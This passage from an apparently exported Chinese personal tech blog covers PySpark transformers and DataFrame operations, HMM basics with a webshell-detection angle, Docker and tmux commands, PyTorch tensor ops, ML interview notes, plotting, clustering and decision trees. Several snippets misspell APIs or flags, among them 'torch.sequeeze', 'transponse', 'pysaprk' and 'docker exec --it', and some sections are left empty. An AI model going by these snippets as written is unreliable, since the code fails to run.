|+-------------------------+-------------------------+|(3,[0,1,2],[2.0,5.0,7.0])|(3,[0,1,2],[2.0,1.0,1.0])||(3,[0,1,2],[3.0,5.0,9.0])|(3,[0,1,2],[3.0,1.0,2.0])||(3,[0,1,2],[4.0,7.0,9.0])|(3,[0,1,2],[4.0,3.0,2.0])||(3,[0,1,2],[2.0,4.0,9.0])|(3,[0,1,2],[2.0,0.0,2.0])||(3,[0,1,2],[9.0,5.0,7.0])|(3,[0,1,2],[9.0,1.0,1.0])||(3,[0,1,2],[2.0,5.0,9.0])|(3,[0,1,2],[2.0,1.0,2.0])||(3,[0,1,2],[3.0,4.0,9.0])|(3,[0,1,2],[3.0,0.0,2.0])||(3,[0,1,2],[8.0,4.0,9.0])|(3,[0,1,2],[8.0,0.0,2.0])||(3,[0,1,2],[3.0,6.0,2.0])|(3,[0,1,2],[3.0,2.0,0.0])||(3,[0,1,2],[5.0,9.0,2.0])|(3,[0,1,2],[5.0,4.0,0.0])|+-------------------------+-------------------------+结果分析：特征向量包含3个特征，即特征0，特征1，特征2。如Row=1,对应的特征分别是2.0,5.0,7.0.被转换为2.0,1.0,1.0。我们发现只有特征1，特征2被转换了，特征0没有被转换。这是因为特征0有6中取值（2，3，4，5，8，9），多于前面的设置setMaxCategories(5)，因此被视为连续值了，不会被转换。特征1中，（4，5，6，7，9）--&gt;(0,1,2,3,4,5)特征2中, (2,7,9)--&gt;(0,1,2) (7)StringIndexer ​ 将label标签进行重新设置，出现的最多的标签被设置为0，最少的设置最大。 1234567891011121314151617按label出现的频次，转换成0～num numOfLabels-1(分类个数)，频次最高的转换为0，以此类推：label=3，出现次数最多，出现了4次，转换（编号）为0其次是label=2，出现了3次，编号为1，以此类推+-----+------------+|label|indexedLabel|+-----+------------+|3.0 |0.0 ||4.0 |3.0 ||1.0 |2.0 ||3.0 |0.0 ||2.0 |1.0 ||3.0 |0.0 ||2.0 |1.0 ||3.0 |0.0 ||2.0 |1.0 ||1.0 |2.0 |+-----+------------+ (8)StringToIndex ​ 功能与StringIndexer完全相反，用于使用StringIndexer后的标签进行训练后，再将标签对应会原来的标签 作用：恢复StringIndexer之前的标签 参数： ​ 1.inputCol 输入列名 ​ 2.outputCol 输出列名 123456789101112|label|prediction|convetedPrediction|+-----+----------+------------------+|3.0 |0.0 |3.0 ||4.0 |1.0 |2.0 ||1.0 |2.0 |1.0 ||3.0 |0.0 |3.0 ||2.0 |1.0 |2.0 ||3.0 |0.0 |3.0 ||2.0 |1.0 |2.0 ||3.0 |0.0 |3.0 ||2.0 |1.0 |2.0 ||1.0 |2.0 |1.0 | 2.评估器​ 评估器就是机器学习模型，通过统计数据从而进行预测工作，每个评估器都必须实现.fit主要分为分类和回归两大类，这里只针对分类评估器进行介绍。 ​ ​ Pyspark的分类评估器包含以下七种： 1.LogisticRegression ​ 逻辑回归模型 2.DecisionTreeClassifier ​ 决策树模型 3.GBTClassifier ​ 梯度提升决策树 4.RandomForestClassifier ​ 随机森林 5.MultilayerPerceptronClassifier ​ 多层感知机分类器]]></content>
      <categories>
        <category>spark</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyspark dataframe基础操作]]></title>
    <url>%2F2018%2F09%2F28%2Fpyspark-dataframe%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[1.select ​ select用于列选择，选择指定列，也可以用于和udf函数结合新增列 ​ 列选择： 12data_set.select("*").show() #选择全部列data_set.select("file_name","webshell").show() #选择file_name，webshell列 ​ 与udf函数组合新增列： 123456from pysaprk.sql.function import udfdef sum(col1,col2): return col1+col2udf_sun = udf(sum,IntergerType())data_set.select("*",udf_sum("a1","a2")).show() #新增一列a1和a2列加和后的列 2.filter ​ filter用于行选择，相当于使用前一半写好的sql语句进行查询。 ​ 查询某个列等于固定值： 1data_set.filter("file_name=='wp-links-opml.php'").show() ​ 查询符合某个正则表达式所有行:​ 1data_set.filter("file_name regexp '\.php$') #选择所有.php结尾文件 3.join ​ pyspark的dataframe横向连接只能使用join进行连接，需要有一列为两个dataframe的共有列 1df_join = df1.join(df,how="left",on='id').show() #id为二者的共有列 4.agg ​ 使用agg来进行不分组聚合操作，获得某些统计项 1234567#获取数据中样本列最大的数值#方式一：df.agg(&#123;"id":"max"&#125;).show() #方式二：import pyspark.sql.functions as fn df.agg(F.min("id")).show() 5.groupby ​ 使用groupby可以用来进行分组聚合。 1df.groupby(") 6.printSchema ​ 以数的形式显示dataframe的概要 123456df.printSchema()output: root |-- id: integer (nullable = true) |-- age: integer (nullable = true) 7.subtract ​ 找到那些在这个dataframe但是不在另一个dataframe中的行，返回一个dataframe 1234df = spark.createDataFrame([[2.0,'a'],[1.0,'b'],[4.0,'b'],[9.0,'b'],[4.3,'c']],schema=schema)df1 = spark.createDataFrame([[2.0,'a'],[4.3,'c']],schema=schema)df.subtract(df1).show() #找到在df中但是不在df1中的行 8.cast ​ 指定某一列的类型 12 9.sort ​ 按照某列来进行排序 参数： ​ columns: 可以是一列，也可以是几列的列表 ​ ascending：升序，默认是True 1data.sort(['count'],ascending=False).show()]]></content>
      <categories>
        <category>spark</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyspark dataframe操作进阶]]></title>
    <url>%2F2018%2F09%2F26%2Fpyspark-dataframe%E6%93%8D%E4%BD%9C%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[​ 这一节主要讲的是spark在机器学习处理过程中常用的一列操作，包括获得各种预处理。 1.将多列转化成一列 ​ pyspark可以直接使用VectorAssembler来将多列数据直接转化成vector类型的一列数据。 1234567891011121314151617181920212223242526272829303132from pyspark.ml.feature import VectorAssemblerdiscretization_feature_names = [ 'discretization_tag_nums', 'discretization_in_link_nums', 'discretization_out_link_nums', 'discretization_style_nums', 'discretization_local_img_nums', 'discretization_out_img_nums', 'discretization_local_script_nums', 'discretization_in_script_nums', 'discretization_out_script_nums']vecAssembler = VectorAssembler(inputCols=discretization_feature_names, outputCol="feature_vec_new")data_set = vecAssembler.transform(dataset) #会返回一个在原有的dataframe上面多出来一列的新dataframedata_set.printscheama()output： root |-- discretization_tag_nums: double (nullable = true) |-- discretization_in_link_nums: double (nullable = true) |-- discretization_out_link_nums: double (nullable = true) |-- discretization_style_nums: double (nullable = true) |-- discretization_local_img_nums: double (nullable = true) |-- discretization_out_img_nums: double (nullable = true) |-- discretization_local_script_nums: double (nullable = true) |-- discretization_in_script_nums: double (nullable = true) |-- discretization_out_script_nums: double (nullable = true) |-- feature_vec_new: vector (nullable = true) #多出来的 2.连续数据离散化 ​ pyspark中提供QuantileDiscretizer来根据分位点来进行离散化的操作，可以根据数据整体情况来对某一列进行离散化。 常用参数： ​ numBuckets：将整个空间分为几份，在对应的分为点处将数据进行切分 ​ relativeError： ​ handleInvalid： 12345678from pyspark.ml.feature import QuantileDiscretizerqds = QuantileDiscretizer(numBuckets=3,inputCol=inputCol, outputCol=outputCol, relativeError=0.01, handleInvalid="error")#这里的setHandleInvalid是代表对缺失值如何进行处理#keep表示保留缺失值dataframe = qds.setHandleInvalid("keep").fit(dataframe).transform(dataframe) 3.增加递增的id列 ​ monotonically_increasing_id() 方法给每一条记录提供了一个唯一并且递增的ID。 123from pyspark.sql.functions import monotonically_increasing_iddf.select("*",monotonically_increasing_id().alias("id")).show() 4.指定读取或创建dataframe各列的类型 ​ pyspark可以支持使用schema创建StructType来指定各列的读取或者创建时的类型，一个StructType里面包含多个StructField来进行分别执行列名、类型、是否为空。 12345678910111213from pyspark.sql.types import *schema = StructType([ StructField("id",IntegerType(),True), StructField("name",StringType(),True)])df = spark.createDataFrame([[2,'a'],[1,'b']],schema)df.printSchema()output: root |-- id: integer (nullable = true) |-- name: string (nullable = true) 5.查看各类缺失值情况 123import pyspark.sql.functions as fndata_set.agg(*[(1-(fn.count(i)/fn.count('*'))).alias(i+"_missing") for i in data_set.columns]).show() ​ 注：在其中agg()里面的 ”\“代表将该列表处理为一组独立的参数传递给函数 6.使用时间窗口来进行分组聚合 ​ 这也是pyspark比pandas多出来的一个时间窗口聚合的使用 12src_ip_feature = feature_data.groupby("srcIp",F.window("time", "60 seconds")).agg( F.count("distIp").alias("request_count"), 7.过滤各种空值 ​ （1）过滤字符串类型的列中的某列为null行 ​ 这里要借助function中的isnull函数来进行 12345import pyspark.sql.function as Fdf.filter(F.isnull(df["response_body"])).show() #只留下response_body列为null的df.filter(~F.isnull(df["response_body"])).show() #只留下response_body列不为null的 ​ 8.列名重命名 ​ 借助selectExpr可以实现在select的基础上使用sql表达式来进行进一步的操作这一特性，将列名进行修改 12#将count列重命名为no_detection_nums,webshelll_names列名不变df = df.selectExpr("webshell_names","count as no_detection_nums")]]></content>
      <categories>
        <category>spark</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HMM入门以及在webshell检测中的应用汇]]></title>
    <url>%2F2018%2F09%2F24%2FHMM%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E5%9C%A8webshell%E6%A3%80%E6%B5%8B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E6%B1%87%2F</url>
    <content type="text"><![CDATA[HMM一、HMM五元素 ​ ​ 其中： ​ N：隐藏状态数 hidden states ​ M：观测状态数 observed states ​ A： 状态转移矩阵 transition matrix ​ B：发射矩阵 emission matrix ​ pi：初始隐状态向量 initial state vector HMM全称隐马尔科夫链，常用与异常检测，在大量正常的模式中找出异常的模式。 ​ 隐马尔科夫链模型相关的问题主要分为三类： 1.已知隐含状态数量、隐含状态的转换矩阵、根据可见的状态链，求出隐藏的状态链 2.已知隐含状态数量、隐含状态的转换矩阵、根据可见的状态链，求得出这个可见状态链的概率 3.已知隐含状态数量、可以观察到多个可见状态链，求因此状态的转移矩阵和发射概率 1.求隐藏状态链问题​ 该问题是在：已知隐含状态数量、隐含状态的转换矩阵、根据可见的状态链，求出隐藏的状态链(也就是最大概率的转移序列) ​ 应用场景：语音识别解码问题 ​ 方法：Viterbi algorithm ​ 时间复杂度：O（m*n^2） m为时间序列的长度，n为每个时间点可能对应的状态数 ​ 举例来说，我知道我有三个骰子，六面骰，四面骰，八面骰。我也知道我掷了十次的结果（1 6 3 5 2 7 3 5 2 4），我不知道每次用了那种骰子，我想知道最有可能的骰子序列。 ​ 首先，如果我们只掷一次骰子：看到结果为1.对应的最大概率骰子序列就是D4，因为D4产生1的概率是1/4，高于1/6和1/8. ​ 把这个情况拓展，我们掷两次骰子：结果为1，6.这时问题变得复杂起来，我们要计算三个值，分别是第二个骰子是D6，D4，D8的最大概率。显然，要取到最大概率，第一个骰子必须为D4。这时，第二个骰子取到D6的最大概率是 ​ 同样的，我们可以计算第二个骰子是D4或D8时的最大概率。我们发现，第二个骰子取到D6的概率最大。而使这个概率最大时，第一个骰子为D4。所以最大概率骰子序列就是D4 D6。​ 继续拓展，我们掷三次骰子：同样，我们计算第三个骰子分别是D6，D4，D8的最大概率。我们再次发现，要取到最大概率，第二个骰子必须为D6。这时，第三个骰子取到D4的最大概率是​ 同上，我们可以计算第三个骰子是D6或D8时的最大概率。我们发现，第三个骰子取到D4的概率最大。而使这个概率最大时，第二个骰子为D6，第一个骰子为D4。所以最大概率骰子序列就是D4 D6 D4。 写到这里，大家应该看出点规律了。既然掷骰子一二三次可以算，掷多少次都可以以此类推。 ​ ​ 我们发现，我们要求最大概率骰子序列时要做这么几件事情。首先，不管序列多长，要从序列长度为1算起，算序列长度为1时取到每个骰子的最大概率。然后，逐渐增加长度，每增加一次长度，重新算一遍在这个长度下最后一个位置取到每个骰子的最大概率。因为上一个长度下的取到每个骰子的最大概率都算过了，重新计算的话其实不难。当我们算到最后一位时，就知道最后一位是哪个骰子的概率最大了。然后，我们要把对应这个最大概率的序列从后往前推出来,这就是Viterbi算法。 2.求得出某个可见状态链的概率​ 该问题是在：已知隐含状态数量、隐含状态的转换矩阵、根据可见的状态链，求得出这个可见状态链的概率 ​ 应用场景：检测观察到的结果与我们已知的模型是否吻合，即异常检测 ​ 方法:前向算法（forward algorithm） ​ 要算用正常的三个骰子掷出这个结果的概率，其实就是将所有可能情况的概率进行加和计算（即在当前的HMM下可能出啊先找个状态链的概率）。同样，简单而暴力的方法就是把穷举所有的骰子序列，还是计算每个骰子序列对应的概率，但是这回，我们不挑最大值了，而是把所有算出来的概率相加，得到的总概率就是我们要求的结果。这个方法依然不能应用于太长的骰子序列（马尔可夫链）。​ 我们会应用一个和前一个问题类似的解法，只不过前一个问题关心的是概率最大值，这个问题关心的是概率之和。解决这个问题的算法叫做前向算法（forward algorithm）。​ 首先，如果我们只掷一次骰子，看到结果为1.产生这个结果的总概率可以按照如下计算，总概率为0.18： ​ 把这个情况拓展，我们掷两次骰子，看到结果为1，6，总概率为0.05： ​ 继续拓展，我们掷三次骰子，看到结果为1，6，3，计算总概率为0.03： ​ 同样的，我们一步一步的算，有多长算多长，再长的马尔可夫链总能算出来的。用同样的方法，也可以算出不正常的六面骰和另外两个正常骰子掷出这段序列的概率，然后我们比较一下这两个概率大小，就能知道你的骰子是不是被人换了。 3. 求状态转移矩阵和发射概率（训练过程）​ 该问题是在： 已知隐含状态数量、可以观察到多个可见状态链 ​ 应用场景：有大量该问题的已知观测序列，想训练一个HMM模型 ​ 方法：Baum-Welch算法 面试常见问题1.HMM的两个不合理假设 1.当前时刻的状态只与上一时刻的状态有关 2.当前表现只与当前状态有关 2.MEMM（最大熵马尔科夫模型）对HMM做了哪些改进还存在哪些问题？ 虽然MEMM解决了HMM输出独立性假设的问题，但是只解决了观察值独立的问题，状态之间的假设则是标注偏置问题产生的根源，CRF则解决了标注偏置问题，是HMM模型的进一步优化。 缺陷：标注偏置问题 HMM： MEMM 2.CRF和HMM和MEMM的不同点 整体来说就是解决了MEMM的标注偏置的问题、去除了HMM中两个不合理的假设 1.HMM是生成式模型，CRF是一种判别式模型。HMM对状态矩阵和发射矩阵进行直接建模，统计共同出现的概率，因此是一种生成式模型； 2.HMM是有向图模型，CRF是无向图模型。 3.CRF是全局最优解，结局了MEMM的标注偏置问题。MEMM是对转移概率和表现概率建立联合概率，统计时统计的是条件概率，由于其只在局部做归一化，所以容易陷入局部最优。 ​ CRF是在全局范围内统计归一化的概率，而不像是MEMM在局部统计归一化概率。是全局最优的解。解决了MEMM中标注偏置的问题。 4.但是CRF的训练代价大，是复杂度高]]></content>
      <categories>
        <category>面试</category>
        <category>NLP</category>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker操作]]></title>
    <url>%2F2018%2F09%2F23%2FDocker%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[-d 容器在后台运行 -P 将容器内部的端口映射到我们的主机上 12docker ps #查看全部正在开启的dockerdocker ps 1.进入以及退出docker​ 进入docker命令主要分为两种，attach和exec命令，但是由于exec命令退出后容器继续运行，因此更为常用。 12345678910#首先查看正在运行的docker，在其中选择想要进入的docker namedocker ps#然后使用exec进行进入dockerdocker exec --it docker_name /bin/bash/#进行各种操作#退出dockerexit或Ctrl+D 2.docker和宿主主机之间传输文件​ docker 使用docker cp 命令来进行复制，无论容器有没有进行运行，复制操作都可以进行执行。 12345#从docker中赋值文件到宿主主机docker cp docker_name:/docker_file_path local_path#从宿主主机复制到dockerdocker cp local_path docker_name:/docker_file_path]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux基本操作]]></title>
    <url>%2F2018%2F09%2F23%2Ftmux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[tmux 是一款终端复用命令行工具，一般用于 Terminal 的窗口管理。 tmux核心功能 1.tmux可以在一个窗口中创建多个窗格 2.终端软件重启后通过命令行恢复上次的session 在tmux中快捷键都需要在使用之前先按前缀快捷键(mac默认⌃b,windows默认control)，以下是常用的集中快捷键列表: 1. 窗格操作 % 左右平分出两个窗格 &quot; 上下平分出两个窗格 x 关闭当前窗格 { 当前窗格前移 } 当前窗格后移 ; 选择上次使用的窗格 o 选择下一个窗格，也可以使用上下左右方向键来选择 space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换 z 最大化当前窗格，再次执行可恢复原来大小 q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格 2.会话操作 ​ 在shell中每次输入tmux都会创建一个tmux会话(session)，在tmux中常用的tmux操作包括： $ 重命名当前会话 s 选择会话列表 d detach 当前会话，运行后将会退出 tmux 进程，返回至 shell 主进程 ​ 在shell准进程中也可以进行直接对session进行操作： tmux new -s foo #创建名为foo的会话 tmux ls #列出所有的tmux tmux a #恢复至上一次回话 tmux a -t foo #恢复会话名称为foo的会话 tmux kill-session -t foo #删除会话名称为foo的会话 tmux kill-server #删除所有会话 除了上面常用的快捷键以外，还可以直接使用前缀快捷键⌃b加?来查看所有快捷键列表]]></content>
      <categories>
        <category>Linux操作</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch向量转化操作]]></title>
    <url>%2F2018%2F09%2F23%2Fpytorch%E5%90%91%E9%87%8F%E8%BD%AC%E5%8C%96%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[1.cat ​ 对数据沿着某一维度进行拼接，cat后数据的总维数不变。 12345678910111213141516171819202122import torchtorch.manual_seed(1)x = torch.randn(2,3)y = torch.randn(1,3)s = torch.cat((x,y),0)print(x,y)print(s)output: 0.6614 0.2669 0.0617 0.6213 -0.4519 -0.1661 [torch.FloatTensor of size 2x3] -1.5228 0.3817 -1.0276 [torch.FloatTensor of size 1x3] 0.6614 0.2669 0.0617 0.6213 -0.4519 -0.1661 -1.5228 0.3817 -1.0276 [torch.FloatTensor of size 3x3] 注：torch.cat和torch.concat作用用法完全相同，只是concat的简写形式 2.unsequeeze和sequeeze ​ torch.sequeeze主要用于维度压缩，去除掉维数为1的维度。 12345678#1.删除指定的维数为1的维度 #方式一： torch.sequeeze(a,2) #方式二： a.sequeeze(2)#2.删除全部维度为1的维度 torch.sequeeze(a) ​ torch.unsequeeze主要用于维度拓展，增加维数为1的维度。 1torch.unsequeeze(a,2) #在维度2增加维数为1的维度]]></content>
      <categories>
        <category>pytorch</category>
      </categories>
      <tags>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch运算操作]]></title>
    <url>%2F2018%2F09%2F23%2Fpytorch%E8%BF%90%E7%AE%97%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[1.transponse ​ torch.transponse操作是转置操作，是一种在矩阵乘法中最常用的几种操作之一。 12#交换两个维度torch.transponse(dim1,dim2) 2.matmul和bmm ​ matmul和bmm都是实现batch的矩阵乘法操作。 123456789a = torch.rand((2,3,10))b = torch.rand((2,2,10))res1 = torch.matmul(a,b.transpose(1,2))#res1 = torch.matmul(a,b.transose(1,2))print res1.size()output: [torch.FloatTensor of size 2x3x2]]]></content>
      <categories>
        <category>pytorch</category>
      </categories>
      <tags>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F09%2F23%2F%E5%B8%B8%E8%A7%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[常见机器学习机基本问题1.参数模型和非参数模型的区别？ 参数模型：在进行训练之前首先对目标函数的进行假设，然后从训练数据中学的相关函数的系数 典型的参数模型：LR、LDA(线性判别分析)、感知机、朴素贝叶斯、简单神经网络 参数模型的优点： 简单：容易理解和解释结果 快速：训练速度快 数据需求量少 参数模型的局限性： 模型的目标函数形式假设大大限制了模型 由于参数模型复杂度一般不高，因此更适合简单问题 非参数模型：不对目标函数的形式做出任何强烈的假设的算法，可以在训练集中自由的学习任何函数形式 典型的非参数模型:KNN、决策树、SVM 非参数学习模型的优点： 灵活性强，可拟合各种不同形式的样本 性能：模型效果一般较好 非参数学习模型的局限性 训练数据需求量大 训练速度慢，因为一般非参数模型要训练更多的参数 可解释性差 更容易出过拟合 2.生成模型和判别模型 由生成方法生成的模型成为生成模型，由判别方法产生的模型成为生成模型。下面重点介绍两种方法。 生成方法:由数据学联合概率分布P(X,Y)，然后求出条件概率P(Y|X)作为预测模型,即生成模型。（之所以称为生成方法是因为模型表示了给定输入X产生出Y的生成关系） 典型的生成模型:朴素贝叶斯、隐马尔科夫链 生成方法特点: 可还原联合概率分布 收敛速度更快 生成方法可处理隐变量，但判别方法不能 判别方法：由数据直接学习决策函数f(x)或者条件概率分布f(Y|X)作为预测模型，即判别模型。 典型的判别模型:KNN、感知机、决策树、LR 判别模型的特点： 直接学习决策函数或条件概率，直接面对预测，准确率更高 由于直接学习决策函数或条件概率，可以对数据进行各种程度上的抽象、定义特征并使用特征，简化学习问题 3.常见损失函数以及应用？ 逻辑斯特损失函数： 对数似然损失 合页损失 指数损失 4.朴素贝叶斯“朴素”表现在哪里？“朴素”主要表现在它假设所有特征在数据集中的作用是同样且独立的，而在真实世界中这种假设是不成立的，因此称之为朴素贝叶斯。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化之散点图和折线图]]></title>
    <url>%2F2018%2F09%2F23%2F%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E4%B9%8B%E6%95%A3%E7%82%B9%E5%9B%BE%E5%92%8C%E6%8A%98%E7%BA%BF%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[数据可视化之散点图和折线图画图基本常用参数plt.figure(figure_size=(30,20)) 指定图片大小 plt.style.use(&#39;ggplot&#39;) 指定图片风格 plt.title(&quot;image title&quot;,fontsize=30) 指定图片标题 指定坐标轴相关my_x_trick = np.arrange(0,200,10) plt.xtricks(my_x_trick,fontsize=20,rotation) 指定x轴，fontsize指定坐标轴字体，rotation指定文字旋转的角度 plt.ytricks(fontsize=20) 指定y轴 ​ 指定画图类型1.折线图plt.plot(x,y) #不指定画图种类时默认为折线图 plt.legend(loc = &quot;best&quot;,fontsize=40,shadow=1) #进行图例格式设定 plt.show() 折线图中plot可用参数：1.color=’red’ 指定折线的颜色2.label=’price’ 指定改颜色的图例表示3.marker=’-‘ 设置折现格式，默认为’-‘,注意这里设置范围不要越界，当设置越界时转换其他图 在一个文件中多次调用plt.plot(),使用不同的数据指定不同颜色和label可在一个图中画多条折线进行对比 2.散点图方式一： plt.scatter(x1,x2,marker=&#39;o&#39;) #指定画散点图，marker为点的形状 plt.show() 方式二： plt.plot(x1,x2,marker=&#39;o&#39;) #plot使用marker=‘o’则为散点图 plt.show() 在实际情况中第二种方式更为灵活，因此我们下重点介绍第二种方式的参数情况。 散点图中常用参数（方式二）： markerfacecolor 散点内部颜色 markeredgecolor 散点边缘颜色 markersize 散点大小 下面我们以DBSCAN聚类后的结果进行将为可视化为例进行效果展示： from sklearn.manifold import TSNE #使用TSNE进行降维 tsne = TSNE(learning_rate=100) x = tsne.fit_transform(input) ​ labels = dbscan.labels_ #获取最终的预测结果 unique_labels = set(dbscan.labels_) colors = plt.cm.Spectral(np.linspace(0,1,len(set(dbscan.labels_)))) #生成和标签种类数相同的颜色数组 core_samples_mask =np.zeros_like(dbscan.labels_,dtype=bool) core_samples_mask[dbscan.core_sample_indices_] = True #将核心对象点对应的位置置true ​ plt.style.use(‘ggplot’) plt.figure(figsize=(30,20)) for k,col in zip(unique_labels,colors): if k==-1: col=’k’ class_member_mask = (labels==k) xy = x[class_member_mask &amp; core_samples_mask] plt.plot(xy[:,0],xy[:,1],’o’,markerfacecolor=col,markeredgecolor=’k’,markersize=10) ​]]></content>
      <categories>
        <category>可视化</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F09%2F23%2FDBSCAN%E5%92%8CKMeans%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90%E5%92%8C%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[DBSCAN和KMeans相关资源和理解1.DBSCANDBSCAN是是一种典型的密度聚类算法，算法主要的思是由密度可达关系导出最大的密度相连样本集合，将其作为一个类。​ 主要参数： 最小分类样本数 半径 DBSCAN算法为有参数算法，聚类的最终结果很大程度上取决于参数的设定 DBSCAN算法不需要指定聚类个数，聚类个数根据算法和数据情况自动获得 DBSCAN聚类过程 首先根据半径画每个点的邻域，当点的邻域内点的个数大于最小样本数时，该点位为核心对象（原始数据集重点的变为核心对象和一般点） 随机确定一个核心点作为初始点，将该初始点全部的最大密度相连的点作为一类。 将分好类样本从原始的样本集中除去，从新选择核心对象作为聚类中心，再进行2.3操作，直至全部核心对象都被分类 DBSCAN代码实现from sklearn.cluster import DBSCAN dbcscan = DBSCAN(min_samples=30,eps=1.8) predict = dbscan.fit_predict(imput) 2.K-MeansKMeans是一种原始性聚类算法，算法主要思想是通过迭代过程把数据集划分为不同的类别，使得评价聚类性能的准则函数达到最优，从而使生成的每个聚类内紧凑，类间独立。这一算法不适合处理离散型数据，对连续性数据具有良好的效果 Kmeans为无参数算法，算法执行过程中不需要进行调参 Kmeans算法需要指定聚类个数K，这在实际问题中是很难进行确定的 KMeans聚类过程 根据指定的K值随机寻找K个点作为初始中心，将其他样本分别分给这些中心 由分好的类计算均值作为其该类新的中心，重新对各个样本分到距离最近的中心，重复这一过程，直至中心不再变化 Kmeans代码实现from sklearn.cluster import KMeans kmeans = KMeans(n_clusters=8) predict = kmeans.fit_predict(input) Kmeans、DBSCAN优缺点对比DBSCAN的主要优点有： 1） 可以对任意形状的稠密数据集进行聚类，相对的，K-Means之类的聚类算法一般只适用于凸数据集。 2） 可以在聚类的同时发现异常点，对数据集中的异常点不敏感。 3） 聚类结果没有偏倚，相对的，K-Means之类的聚类算法初始值对聚类结果有很大影响。 DBSCAN的主要缺点有： 1）如果样本集的密度不均匀、聚类间距差相差很大时，聚类质量较差，这时用DBSCAN聚类一般不适合。 2） 如果样本集较大时，聚类收敛时间较长，此时可以对搜索最近邻时建立的KD树或者球树进行规模限制来改进。 3） 调参相对于传统的K-Means之类的聚类算法稍复杂，主要需要对距离阈值ϵ，邻域样本数阈值MinPts联合调参，不同的参数组合对最后的聚类效果有较大影响。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[决策树模型之CART树和C5.0]]></title>
    <url>%2F2018%2F09%2F23%2F%E5%86%B3%E7%AD%96%E6%A0%91%E6%A8%A1%E5%9E%8B%E4%B9%8BCART%E6%A0%91%E5%92%8CC5-0%2F</url>
    <content type="text"><![CDATA[决策树模型之CART树和C5.0树模型基本思想：计算结点的纯度来选择最具显著性的切分不同树模型之间的差异：差异在于衡量纯度变化的标准不同 CART树：Gini系数C5.0树：信息熵增益 1.回归树(CART树)回归树也成为分类回归树，是一种既可用于分类也可用于回归的算法。 CART树分类的主要步骤：1. 决策树的生成：递归的构建而决策树的过程，基于训练数据生成决策树，生成的决策树数量应尽量大。 自上而下的从根开始建立节点，在每个节点处选择一个最好的属性来分类，使子节点红的训练集尽可能的顿。 不同算法使用不同的指标来衡量“最好”： 分类算法：一般选择Gini系数 回归算法：使用最小二乘偏差（LSD）或最小绝对偏差（LSA） 2.决策树剪枝：用验证数据集对已生成的树进行剪枝并选择最优子树这时损失函数最小做为标准 分类树的生成 对每个特征A，对它所有的可能取值a，将数据集划分为A=a和A!=a两个部分计算集合D的基尼指数： 遍历所有的特征 A，计算其所有可能取值 a 的基尼指数，选择 D 的基尼指数最小值对应的特征及切分点作为最优的划分，将数据分为两个子集。 对上述两个子节点递归调用步骤(1)(2), 直到满足停止条件。 生成CART树 基尼指数： 是一种不等度的度量 是介于0~1之间的数，0-完全相等，1-完全不相等 总体内包含的类别越杂乱，Gini指数就越大 分类问题中，假设存在K个类，样本属于第k个类的概率为pk，则概率分布的Gini指数为： 样本集合D的Gini指数为：​ 当在数据集D上根据某一取值a进行分割，得到D1、D2两部分后，那么特征A下集合D的Gini指数为：​ 算法停止条件： 节点中样本个数小于预定阈值 样本的Gini指数小于阈值 没有更多特征 剪枝在完整的的决策树上，减掉一些完整的子支是决策树变小，从而防止决策树过拟合。 决策树很容易产生过拟合，改善的方式包括： 通过阈值控制终止条件，防止分支过细 对决策树进行剪枝 建立随机森林 2.C5.0节点分裂标准：信息增益比 C系列决策树发展过程： 阶段一：ID3 节点选择标准：信息增益 缺陷：1. 方法会倾向与属性值比较多的变量（如省份字段存在31个水平，性别由两个水平，信息增益会考虑选择省份做特征节点 2.构造树时不能很好地处理连续变量 阶段二：C4.5 节点选择标准：信息增益比（避免了偏袒） 缺点：运行效率很低 阶段三：C5.0 商业版的C4.5，提升了算法效率，但没有公布具体算法细节 C5.0算法特点1.C5.0是一种多叉树。 如果根节点或者中间节点为连续变量，则改变量一定会一分为二成为两个分支；如果根节点或者中间节点为离散变量，则分开离散变量水平数个分支；因此一个变量一旦被使用，后面节点都不会在使用该变量。 2.C5.0生成树采用信息增益比进行分裂节点的选择3.剪枝采用“减少误差”法和“减少损失”法进行。 减少误差法：核心思想是比较剪枝前后的误差率 误差率的计算：如果第i个节点中包含N个样本，其中预测错误的样本量为M，则该节点的错误率为f=M/N 减少损失法：该方法结合损失矩阵对树进行剪枝，核心是剪枝前后的的损失量。 